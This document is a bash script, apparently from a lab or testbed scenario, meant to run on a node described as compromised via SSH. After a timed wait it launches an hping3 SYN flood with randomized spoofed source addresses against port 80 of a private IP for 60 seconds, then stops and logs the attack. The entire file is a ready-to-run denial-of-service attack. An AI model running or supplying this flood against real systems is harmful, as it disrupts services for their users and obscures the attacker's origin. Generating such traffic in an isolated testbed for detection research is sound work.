#!/bin/bash
# Hping3 DDoS Attack Script
# Runs ON THE COMPROMISED NODE after SSH compromise
# Starts at T=60s (1 min), stops at T=120s (2 min)
# Attack duration: 60 seconds

TARGET_IP="192.168.100.10"
ATTACK_START=60
ATTACK_STOP=120

echo "[*] Hping3 DDoS Attack - Compromised Node"
echo "[*] Target: $TARGET_IP"
echo "[*] Attack starts at T+60s, stops at T+120s"
echo "[*] Current time: $(date)"

# Phase 1: Wait until 1 minute mark
echo "[*] Waiting until attack start (60s)..."
sleep $ATTACK_START
echo "[*] Attack start time: $(date)"

# Phase 2: Launch hping3 flood attack
hping3 --flood --dport 80 --rand-source $TARGET_IP &
HPING_PID=$!
echo "[*] hping3 started with PID: $HPING_PID"

# Phase 3: Wait until 2 minute mark then stop attack
echo "[*] Attack running... (will stop at T+120s)"
sleep $((ATTACK_STOP - ATTACK_START))
echo "[*] Attack stop time: $(date)"

# Kill hping3
kill $HPING_PID 2>/dev/null
wait $HPING_PID 2>/dev/null
echo "[*] hping3 stopped. Attack complete."

# Record evidence
echo "Hping3 attack executed on $(hostname) at $(date)" >> /var/log/hping3_attack.log
